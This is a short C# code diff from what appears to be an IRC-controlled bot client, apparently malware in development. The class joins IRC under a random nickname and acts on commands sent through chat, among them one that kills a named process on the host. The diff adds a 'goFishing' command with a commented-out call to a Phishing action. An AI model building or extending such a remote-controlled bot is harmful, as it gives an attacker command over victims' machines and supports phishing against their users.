@@ -11,7 +11,7 @@ using System.IO;
 
 namespace tom
 {
-    class IRC
+    public class IRC
     {
         public string VERSION = "v2";
 
@@ -23,9 +23,11 @@ namespace tom
         private string name = "";
 
         String[] names = {"tom", "bob", "nancy", "drew", "john", "liza", "ellie", "patsy", "jesus", "murphy", "higgs", "tim", "sheldon", "picard"};
-
-        public IRC()
+        Form1 mainForm;
+        public IRC(Form1 mainForm)
         {
+            this.mainForm = mainForm;
+
             actions = new BotActions(this);
 
             Random r = new Random();            
@@ -44,9 +46,9 @@ namespace tom
                                              MessageBoxButtons.AbortRetryIgnore,
                                              MessageBoxIcon.Error);
             }
-            
 
             Connect(name);
+            
         }
 
         public void NewMessage(string message)
@@ -112,6 +114,16 @@ namespace tom
                 case "kill":
                     if (commands.Count > 1)
                         actions.KillProcess(commands[1]);
+                    break;
+                case "goFishing":
+                    //if (commands.Count > 1)
+                    //    actions.Phishing(commands[1]);
+                                     
+                    mainForm.Invoke(new MethodInvoker(delegate ()
+                    {
+                        mainForm.test();
+                    }));
+
                     break;
             }
         }
